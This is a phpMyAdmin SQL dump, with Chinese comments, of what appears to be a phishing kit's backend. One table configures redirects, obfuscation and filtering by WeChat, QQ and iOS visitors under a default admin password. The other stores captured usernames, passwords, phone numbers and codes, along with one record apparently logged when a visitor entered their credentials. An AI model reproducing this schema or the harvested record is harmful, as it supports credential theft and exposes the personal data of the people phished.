-- phpMyAdmin SQL Dump
-- version 4.9.5
-- 
--
-- 主机： localhost
-- 生成日期： 2023-04-27 23:43:24
-- 服务器版本： 5.7.40-log
-- PHP 版本： 5.6.40

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- 数据库： `tp`
--

-- --------------------------------------------------------

--
-- 表的结构 `ec_conf`
--

CREATE TABLE `ec_conf` (
  `id` int(11) NOT NULL,
  `user` varchar(50) DEFAULT NULL,
  `pass` varchar(50) DEFAULT NULL,
  `title` varchar(200) DEFAULT NULL,
  `readyJump` varchar(200) DEFAULT NULL,
  `location` varchar(200) DEFAULT NULL,
  `confusion` int(11) DEFAULT NULL,
  `viewTimes` int(11) DEFAULT NULL,
  `allowWeixin` int(11) DEFAULT NULL,
  `allowQQ` int(11) DEFAULT NULL,
  `allowIOS` int(11) DEFAULT NULL,
  `allowAll` int(11) DEFAULT NULL,
  `denyReady` int(11) DEFAULT NULL,
  `deny` int(11) DEFAULT NULL,
  `tongji` varchar(300) DEFAULT NULL,
  `logo` varchar(300) DEFAULT NULL,
  `datatype` varchar(200) DEFAULT NULL,
  `lasttype` int(11) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `ec_conf`
--

INSERT INTO `ec_conf` (`id`, `user`, `pass`, `title`, `readyJump`, `location`, `confusion`, `viewTimes`, `allowWeixin`, `allowQQ`, `allowIOS`, `allowAll`, `denyReady`, `deny`, `tongji`, `logo`, `datatype`, `lasttype`) VALUES
(1, 'admin', '123456', '', 'https://www.xbeian.com/0-12OoOT92yUuMCVr3CRHwE.html', 'https://docs.qq.com/', 5, 0, 1, 1, 1, 1, 1, 0, '', 'game', '1', 3);

-- --------------------------------------------------------

--
-- 表的结构 `ec_data`
--

CREATE TABLE `ec_data` (
  `id` int(11) NOT NULL,
  `del` tinyint(1) UNSIGNED ZEROFILL DEFAULT '0',
  `user` varchar(50) DEFAULT NULL,
  `pass` varchar(50) DEFAULT NULL,
  `phone` varchar(500) DEFAULT NULL,
  `code` varchar(200) DEFAULT NULL,
  `state` int(11) DEFAULT NULL,
  `href` varchar(200) DEFAULT NULL,
  `date` varchar(200) DEFAULT NULL,
  `time` varchar(50) DEFAULT NULL,
  `visit` int(11) DEFAULT '0',
  `city` varchar(50) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `info` varchar(200) DEFAULT NULL,
  `logs` text,
  `send` varchar(200) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `ec_data`
--

INSERT INTO `ec_data` (`id`, `del`, `user`, `pass`, `phone`, `code`, `state`, `href`, `date`, `time`, `visit`, `city`, `ip`, `info`, `logs`, `send`) VALUES
(1, 0, '18722421033', '7498798789789', '18722421033', '', 0, 'http://gg.lwcgk.store/Top/app/data.php', '2023-04-27 23:40:43', '1682610201', 3, '陕西县|电信', '124.115.23.342', 'PC访问', '用户填写了账号密码', NULL);

--
-- 转储表的索引
--

--
-- 表的索引 `ec_conf`
--
ALTER TABLE `ec_conf`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- 表的索引 `ec_data`
--
ALTER TABLE `ec_data`
  ADD PRIMARY KEY (`id`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `ec_conf`
--
ALTER TABLE `ec_conf`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- 使用表AUTO_INCREMENT `ec_data`
--
ALTER TABLE `ec_data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
